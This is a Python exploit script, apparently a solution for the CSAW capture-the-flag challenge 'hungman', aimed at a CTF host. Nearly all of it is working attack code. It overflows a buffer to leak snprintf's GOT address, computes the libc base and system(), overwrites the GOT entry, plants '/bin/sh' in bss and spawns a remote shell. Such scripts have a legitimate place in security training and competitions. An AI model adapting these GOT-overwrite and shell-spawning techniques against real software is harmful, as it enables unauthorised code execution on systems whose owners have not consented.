#!/usr/bin/env python
from sc_pwn import *
import string

env = Environment('local', 'remote')
env.set_item('target',  local   = {'host':'192.168.75.139','port':8080}, \
                        remote  = {'host':'pwn.chal.csaw.io','port':8003})
env.set_item('libc',    local   = 'D:\CTF\FILES\libc-2.19.so_amd64_local', \
                        remote  = 'libc-2.23.so')
env.select()

binf = ELF('hungman')
libc = ELF(env.libc)

addr_got_snprintf   = binf.got('snprintf')
addr_bss_s          = 0x602100

#==========
def attack(cmn):
    name = string.ascii_lowercase+string.digits
    
    cmn.read_until('your name?')
    cmn.sendln(name)
    cmn.read_until('Welcome %s\n' % name)

    do(cmn)

    exploit  = 'a'*0x30
    exploit += pack_32(0)
    exploit += pack_32(0x20)
    exploit += pack_64(addr_got_snprintf)

    cmn.sendln(exploit)
    cmn.read_until('Highest player: ')

    addr_libc_snprintf  = cmn.read_until(' score:', contain=False)
    addr_libc_snprintf  = unpack_64(addr_libc_snprintf+'\x00'*(8-len(addr_libc_snprintf)))
    libc.set_location('snprintf', addr_libc_snprintf)
    info('addr_libc_base    = 0x%08x' % libc.base)
    
    addr_libc_system    = libc.function('system')

    do(cmn)

    payload  = pack_64(addr_libc_system)
    payload += '\x00'*(addr_bss_s-addr_got_snprintf-8)
    payload += '/bin/sh\0'
    cmn.sendln(payload)

def do(cmn):
    done = False

    while not done:
        for c in string.ascii_lowercase:
            s = cmn.read_until()
            if 'score' in s:
                if 'Default' in s:
                    cmn.read_until('Continue? ')
                else:
                    done = True
                cmn.sendln('y')
                break
            cmn.sendln(c)

#==========

if __name__=='__main__':
    cmn = Communicate(env.target,mode='SOCKET')
    attack(cmn)

    sh = Shell(cmn)
    sh.select()
    del(sh)
    #Interact(cmn).worker(True)
    
    del(cmn)
    
#==========
